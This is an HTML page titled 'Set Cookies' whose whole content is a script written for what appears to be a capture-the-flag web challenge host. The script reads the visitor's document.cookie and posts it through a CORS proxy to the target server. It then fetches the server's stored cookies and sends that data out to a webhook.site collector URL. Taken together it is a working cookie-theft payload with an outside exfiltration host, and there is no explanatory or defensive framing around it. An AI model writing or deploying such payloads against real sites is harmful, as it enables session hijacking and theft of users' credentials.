<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Set Cookies</title>
</head>
<body>
    <h1>Set Cookies</h1>
    <script>
        // Encode the document.cookie value
        const encodedCookieValue = encodeURIComponent(document.cookie);
        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
        const targetUrl = 'https://host3.metaproblems.com:6020/index.php';

        // Fetch request to set cookies
        fetch(proxyUrl + targetUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `cookie_name=16&cookie_value=${encodedCookieValue}&submit=Store+Cookie`
        })
        .then(response => response.json())
        .then(data => console.log('Cookie stored:', data))
        .catch(error => console.error('Error storing cookie:', error));

        // Fetch request to retrieve cookies
        const cookiesUrl = 'https://host3.metaproblems.com:6020/cookies.php';
        fetch(proxyUrl + cookiesUrl)
        .then(response => response.text())
        .then(data => {
            console.log('Cookies:', data);
            return fetch(`https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?x=${encodeURIComponent(data)}`);
        })
        .then(response => response.text())
        .then(data => console.log('Webhook response:', data))
        .catch(error => console.error('Error retrieving cookies:', error));
    </script>
</body>
</html>
